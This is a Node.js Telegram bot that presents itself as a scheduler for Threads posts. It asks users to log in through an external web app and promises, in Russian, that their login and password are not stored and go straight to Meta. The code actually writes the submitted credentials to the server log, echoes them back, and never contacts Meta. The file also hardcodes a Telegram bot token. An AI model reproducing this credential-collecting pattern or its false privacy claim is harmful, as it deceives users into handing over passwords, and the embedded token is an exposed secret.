const TelegramBot = require("node-telegram-bot-api");
const { ThreadsAPI } = require("threads-api");
const express = require("express");
const cors = require("cors");

const deviceID = `android-${(Math.random() * 1e24).toString(36)}`;
const token = "6365340686:AAHjqorsz92U2XYiBJQRtYfif5zRYMQvWcc";
const webAppUrl = "https://musical-pasca-6a0bee.netlify.app/";

const bot = new TelegramBot(token, { polling: true });
const app = express();
app.use(express.json());
app.use(cors());

bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === "/start") {
        await bot.sendMessage(
            chatId,
            "Привет! Я помогу тебе публиковать посты в Threads в нужное тебе время ⏰ Просто напиши мне текст публикации и время, в которое он должен появится в Threads, а я всё сделаю сам 😉. Но давай сначала пройдем простую авторизацию. Не переживай, твои логин и пароль я не храню у себя, а отправляю напрямую в Meta 🔐",
            {
                reply_markup: {
                    keyboard: [
                        [
                            {
                                text: "Авторизоваться",
                                web_app: { url: webAppUrl },
                            },
                            {
                                text: "Я передумал",
                                callback_data: "cancel",
                            },
                        ],
                    ],
                },
            }
        );
    }
    console.log(msg);
    if (msg?.web_app_data?.data) {
        try {
            const data = JSON.parse(msg?.web_app_data?.data);
            console.log(data);
            await bot.sendMessage(chatId, "Данные успешно получены");
            await bot.sendMessage(chatId, "Ваш логин: " + data?.login);
            await bot.sendMessage(chatId, "Ваш пароль: " + data?.password);

            setTimeout(async () => {
                await bot.sendMessage(
                    chatId,
                    "Всю информацию вы получите в этом чате"
                );
            }, 3000);
        } catch (e) {
            console.log(e);
        }
    }
});

bot.on("callback_query", (query) => {
    let id = query.message.chat.id;

    switch (query.data) {
        case "cancel":
            bot.sendMessage(
                id,
                "Окей, можешь вернуться в любое время, я всегда здесь"
            );
            break;
    }
});

const PORT = 8000;
app.listen(PORT, () => console.log("server started on PORT " + PORT));
